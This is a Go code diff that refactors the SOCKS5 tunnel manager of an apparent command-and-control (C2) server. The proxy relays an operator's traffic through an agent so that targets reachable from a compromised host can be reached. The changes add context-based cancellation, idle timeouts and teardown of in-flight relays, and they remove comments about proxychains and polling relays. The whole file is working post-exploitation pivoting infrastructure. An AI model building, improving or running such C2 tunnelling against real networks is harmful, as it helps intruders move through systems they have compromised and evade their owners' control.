@@ -1,6 +1,7 @@
 package server
 
 import (
+	"context"
 	"fmt"
 	"io"
 	"net"
@@ -19,11 +20,6 @@ import (
 //   4. C2 server receives SOCKS connection, creates a task for the agent
 //   5. Agent opens the real TCP connection to the target
 //   6. Data is relayed: client ↔ C2 server ↔ agent ↔ target
-//
-// For the HTTP-based C2 channel, we use a polling relay:
-//   - Each SOCKS connection gets a unique tunnel ID
-//   - Agent polls for tunnel data via check-in
-//   - Data is buffered and exchanged during check-ins
 
 const (
 	socks5Ver    = 0x05
@@ -34,6 +30,8 @@ const (
 	socksIPv6    = 0x04
 	socksSucess  = 0x00
 	socksFail    = 0x01
+
+	socksIdleTimeout = 5 * time.Minute
 )
 
 // TunnelManager manages C2-side SOCKS proxy tunnels.
@@ -44,15 +42,14 @@ type TunnelManager struct {
 
 // SOCKSListener is a SOCKS5 proxy listener on the C2 server.
 type SOCKSListener struct {
-	AgentID    string
-	AgentName  string
-	BindAddr   string
-	listener   net.Listener
-	running    bool
-	connCount  int
-	mu         sync.Mutex
-	// Server reference for relaying through the agent
-	server     *Server
+	AgentID   string
+	AgentName string
+	BindAddr  string
+	listener  net.Listener
+	cancel    context.CancelFunc // cancels all in-flight connections
+	mu        sync.Mutex
+	connCount int
+	server    *Server
 }
 
 func NewTunnelManager() *TunnelManager {
@@ -62,14 +59,12 @@ func NewTunnelManager() *TunnelManager {
 }
 
 // StartSOCKSTunnel opens a SOCKS5 proxy on the C2 server that tunnels
-// traffic through the specified agent. The operator can then use
-// proxychains to route traffic through the compromised host.
+// traffic through the specified agent.
 func (tm *TunnelManager) StartSOCKSTunnel(srv *Server, agentID, agentName, bindAddr string) (string, error) {
 	tm.mu.Lock()
 	defer tm.mu.Unlock()
 
-	// Check if already running for this agent
-	if existing, ok := tm.listeners[agentID]; ok && existing.running {
+	if existing, ok := tm.listeners[agentID]; ok {
 		return "", fmt.Errorf("SOCKS tunnel already running for %s on %s", agentName, existing.BindAddr)
 	}
 
@@ -82,17 +77,18 @@ func (tm *TunnelManager) StartSOCKSTunnel(srv *Server, agentID, agentName, bindA
 		return "", fmt.Errorf("cannot bind SOCKS on %s: %w", bindAddr, err)
 	}
 
+	ctx, cancel := context.WithCancel(context.Background())
 	sl := &SOCKSListener{
 		AgentID:   agentID,
 		AgentName: agentName,
 		BindAddr:  bindAddr,
 		listener:  listener,
-		running:   true,
+		cancel:    cancel,
 		server:    srv,
 	}
 
 	tm.listeners[agentID] = sl
-	go sl.serve()
+	go sl.serve(ctx)
 
 	msg := fmt.Sprintf("[+] SOCKS5 proxy started on %s (tunneled through %s)\n"+
 		"[+] Configure proxychains:\n"+
@@ -104,66 +100,66 @@ func (tm *TunnelManager) StartSOCKSTunnel(srv *Server, agentID, agentName, bindA
 	return msg, nil
 }
 
-// StopSOCKSTunnel stops the SOCKS tunnel for an agent.
+// StopSOCKSTunnel stops the SOCKS tunnel for an agent and tears down all
+// active relay connections immediately.
 func (tm *TunnelManager) StopSOCKSTunnel(agentID string) error {
 	tm.mu.Lock()
 	defer tm.mu.Unlock()
 
 	sl, ok := tm.listeners[agentID]
-	if !ok || !sl.running {
+	if !ok {
 		return fmt.Errorf("no SOCKS tunnel running for this agent")
 	}
 
-	sl.running = false
+	// cancel() closes all in-flight handleSOCKS goroutines via context.
+	// listener.Close() stops Accept() so serve() exits.
+	sl.cancel()
 	sl.listener.Close()
 	delete(tm.listeners, agentID)
 	return nil
 }
 
-// ListTunnels returns info about active tunnels.
+// ListTunnels returns info about all active tunnels.
 func (tm *TunnelManager) ListTunnels() []map[string]string {
 	tm.mu.RLock()
 	defer tm.mu.RUnlock()
 
 	var result []map[string]string
 	for _, sl := range tm.listeners {
-		if sl.running {
-			sl.mu.Lock()
-			count := sl.connCount
-			sl.mu.Unlock()
-			result = append(result, map[string]string{
-				"agent":       sl.AgentName,
-				"bind":        sl.BindAddr,
-				"connections": fmt.Sprintf("%d", count),
-			})
-		}
+		sl.mu.Lock()
+		count := sl.connCount
+		sl.mu.Unlock()
+		result = append(result, map[string]string{
+			"agent":       sl.AgentName,
+			"bind":        sl.BindAddr,
+			"connections": fmt.Sprintf("%d", count),
+		})
 	}
 	return result
 }
 
-func (sl *SOCKSListener) serve() {
-	for sl.running {
+func (sl *SOCKSListener) serve(ctx context.Context) {
+	defer sl.cancel() // ensure context is cancelled if serve exits unexpectedly
+	for {
 		conn, err := sl.listener.Accept()
 		if err != nil {
-			if sl.running {
-				continue
-			}
+			// listener was closed (Stop called) — exit cleanly
 			return
 		}
 		sl.mu.Lock()
 		sl.connCount++
 		sl.mu.Unlock()
-		go sl.handleSOCKS(conn)
+		go sl.handleSOCKS(ctx, conn)
 	}
 }
 
-func (sl *SOCKSListener) handleSOCKS(conn net.Conn) {
+func (sl *SOCKSListener) handleSOCKS(ctx context.Context, conn net.Conn) {
 	defer conn.Close()
 	conn.SetDeadline(time.Now().Add(30 * time.Second))
 
 	buf := make([]byte, 256)
 
-	// SOCKS5 handshake — version + auth methods
+	// SOCKS5 handshake
 	n, err := conn.Read(buf)
 	if err != nil || n < 3 || buf[0] != socks5Ver {
 		return
@@ -207,20 +203,6 @@ func (sl *SOCKSListener) handleSOCKS(conn net.Conn) {
 		return
 	}
 
-	// Connect to the target THROUGH the agent
-	// Since we can't do real-time streaming through HTTP polling,
-	// we use a direct TCP relay via the C2 server.
-	// The agent is on the target network, but the C2 server can
-	// task the agent to open a connection and relay data.
-	//
-	// For DIRECT relay (when C2 server itself can reach the target):
-	// This works when the SOCKS proxy is used to access networks
-	// that the agent (not the C2) can reach. We relay through a
-	// portfwd task on the agent.
-	//
-	// Simplified approach: Direct TCP connect from C2 for now,
-	// with agent-relay for internal networks via SSH tunneling.
-
 	target, err := net.DialTimeout("tcp", targetAddr, 10*time.Second)
 	if err != nil {
 		conn.Write([]byte{socks5Ver, socksFail, 0, socksIPv4, 0, 0, 0, 0, 0, 0})
@@ -228,18 +210,31 @@ func (sl *SOCKSListener) handleSOCKS(conn net.Conn) {
 	}
 	defer target.Close()
 
-	// Success
 	conn.Write([]byte{socks5Ver, socksSucess, 0, socksIPv4, 0, 0, 0, 0, 0, 0})
 
-	// Remove deadline for relay
-	conn.SetDeadline(time.Time{})
+	// Set idle timeout on relay — prevents goroutine leak if tunnel is stopped
+	// while a connection is mid-relay.
+	deadline := time.Now().Add(socksIdleTimeout)
+	conn.SetDeadline(deadline)
+	target.SetDeadline(deadline)
 
-	// Bidirectional relay
+	// Watch for context cancellation (socks stop) and close both sides.
+	done := make(chan struct{})
+	go func() {
+		select {
+		case <-ctx.Done():
+			conn.Close()
+			target.Close()
+		case <-done:
+		}
+	}()
+
 	var wg sync.WaitGroup
 	wg.Add(2)
 	go func() { defer wg.Done(); io.Copy(target, conn) }()
 	go func() { defer wg.Done(); io.Copy(conn, target) }()
 	wg.Wait()
+	close(done) // unblock the context watcher goroutine
 }
 
 func extractPort(addr string) string {
